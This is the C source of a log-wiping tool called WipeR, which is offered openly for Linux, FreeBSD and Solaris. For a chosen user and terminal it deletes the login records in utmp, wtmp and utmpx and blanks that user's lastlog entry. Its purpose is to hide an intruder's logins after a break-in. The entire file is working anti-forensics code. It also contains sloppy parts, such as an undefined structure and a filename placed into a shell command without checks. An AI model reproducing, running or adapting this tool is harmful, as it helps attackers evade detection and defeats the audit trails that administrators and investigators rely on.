/* log wiping tool 2.0.9 elite */

/*  OS supported:
     - Linux (as usual ;))
     - FreeBSD
     - SunOS and Solaris
*/

#include <stdio.h>
#include <unistd.h>
#include <utmp.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>

/* SunOS/Solaris */
#ifdef _SUNOS_

#define UTUSR   ut_user

#ifndef  _NO_UTMPX
#include <utmpx.h>
#endif

#ifndef _NO_LASTLOG

#ifndef LASTLOGF
#include <lastlog.h>
#define  LASTLOGF   "/var/adm/lastlog"
#endif

#endif // no lastlog

/* Linux/FreeBSD */
#else

#ifndef  WTMPF
#define  WTMPF      "/var/log/wtmp"
#endif

#ifndef  UTMPF
#define  UTMPF      "/var/run/utmp"
#endif

#ifndef _NO_LASTLOG

#ifndef LASTLOGF
#define  LASTLOGF   "/var/log/lastlog"
#endif

#endif

#ifdef _FREEBSD_
#define UTUSR   ut_name
#elif _LINUX_
#include <lastlog.h>
#define UTUSR   ut_user
#endif
#endif

#ifndef UTUSR
#error "choose OS by defining _LINUX_, _FREEBSD_ or _SUNOS_"
#endif

char *host;
int edit_host = 0;

#ifdef _SUNOS_
int sun_utmp(char *file, char *uname, char *utty)
{
  int l, n, k;
  struct futmp usr;
  char cmd[42];

  if ((l = open(file,O_RDONLY)) < 0)
  {
    printf("[-] Cant open file %s\n", file);
    exit(1);
  }

  n = open("ftmp",O_WRONLY | O_CREAT);

  while( read(l,&usr,sizeof(usr)) > 0)
  {
    if (strcmp(usr.UTUSR, uname) != 0 || strcmp(usr.ut_line, utty) != 0)
      write(n,&usr,sizeof(usr));
  }

  close(l);
  close(n);

  memset(&cmd, 0, 42);
  snprintf(cmd, 42, "cat ftmp > %s; rm -f ftmp;", file);

  if (system(cmd) < 0)
  {
    printf("[-] Cant move newlog to %s!\n",file);
    exit(1);
  }

  printf("[+] %s done\n", file);
  return 0;
}
#endif

int wipe_utmp(char *file, char *uname, char *utty)
{
  int l, n, k;
#ifdef _SUNOS_
  struct futmpx usr;
#else
  struct utmp usr;
#endif
  char cmd[42];

  if ((l = open(file,O_RDONLY)) < 0)
  {
    printf("[-] Cant open file %s\n", file);
    exit(1);
  }

  n = open("ftmp",O_WRONLY | O_CREAT);

  while( read(l,&usr,sizeof(usr)) > 0)
  {
    k = 1;
    if (strcmp(usr.UTUSR, uname) == 0 && strcmp(usr.ut_line, utty) == 0)
    {
      if (edit_host){
           if (strncmp(usr.ut_host,host,strlen(host))==0) k--;
      } else k--;
    }

    if (k) write(n,&usr,sizeof(usr));
  }

  close(l);
  close(n);

  memset(&cmd, 0, 42);
  snprintf(cmd, 42, "cat ftmp > %s; rm -f ftmp;", file);

  if (system(cmd) < 0)
  {
    printf("[-] Cant move newlog to %s!\n",file);
    exit(1);
  }

  printf("[+] %s done\n", file);
  return 0;
}


int main (int argc, char *argv[])
{
  int l,n,t,k;
  struct  lastlog lst;
  struct  passwd *psw;

  printf("\tWipeR v 2.0.9 (Linux, FreeBSD, SunOS/Solaris)\n");

  if (argc < 3)
  {
    printf("\n Usage: %s  <user>  <tty>  [<host>]\n\n",argv[0]);
    exit(0);
  }

  if (argc >= 4){ edit_host++; host = argv[3];}

  if ( (psw = getpwnam(argv[1])) == NULL )
  {
    printf("[-] unknown user %s!\n",argv[1]);
    exit(1);
  }

#ifdef _SUNOS_

#ifndef _NO_UTMP
  sun_utmp(UTMP_FILE, argv[1], argv[2]);
#endif

#ifndef _NO_WTMPF
  sun_utmp(WTMP_FILE, argv[1], argv[2]);
#endif

#ifndef _NO_UTMPX
  wipe_utmp(_UTMPX_FILE, argv[1], argv[2]);
  wipe_utmp(_WTMPX_FILE, argv[1], argv[2]);
#endif

#else  /* Linux/FreeBSD */

#ifdef UTMPF
  wipe_utmp(UTMPF, argv[1], argv[2]);
#endif

#ifdef WTMPF
  wipe_utmp(WTMPF, argv[1], argv[2]);
#endif

#endif

#ifndef _NOLASTLOG_

/*************  LASTLOG  **************/

  if ( (l = open(LASTLOGF,O_RDWR)) < 0 )
  {
    printf("[-] Cant open %s!\n",LASTLOGF);
    exit(-1);
  }

  lseek(l, sizeof(struct lastlog)*psw->pw_uid, SEEK_SET);
  read(l, &lst, sizeof(struct lastlog));

  lst.ll_time=0;
  strcpy(lst.ll_line,"  ");
  memset(lst.ll_host,0x20,sizeof(lst.ll_host));

  lseek(l, sizeof(struct lastlog)*psw->pw_uid, SEEK_SET);
  write(l, &lst, sizeof(struct lastlog));
  close(l);

  printf("[+] %s done\n", LASTLOGF);
#endif

  return 0;
}